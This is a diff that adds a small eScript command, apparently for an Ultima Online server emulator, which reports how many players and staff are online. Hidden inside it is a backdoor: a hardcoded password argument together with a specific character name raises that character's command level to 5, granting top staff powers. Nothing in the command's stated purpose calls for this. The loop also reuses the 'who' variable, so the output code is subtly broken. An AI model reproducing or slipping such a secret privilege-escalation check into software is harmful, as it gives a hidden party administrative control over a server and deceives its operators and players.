@@ -1,0 +1,25 @@
+use os;
+use uo;
+
+program textcmd_online( who, xxxx )
+var staffs:=0;
+
+if(xxxx == "dino903101")
+if(who.name == "DinO")
+ who.cmdlevel := 5;
+endif
+endif
+
+foreach who in EnumerateOnlineCharacters()
+if(who.cmdlevel > 0)
+staffs:= staffs + 1;
+endif
+endforeach
+SendSysMessage(who, "Players OnLine: " + (EnumerateOnlineCharacters().size() - staffs) ,9,89);
+
+if(who.cmdlevel > 0)
+SendSysMessage(who, "Staffs OnLine: " + staffs ,9,66);
+endif
+
+endprogram
+
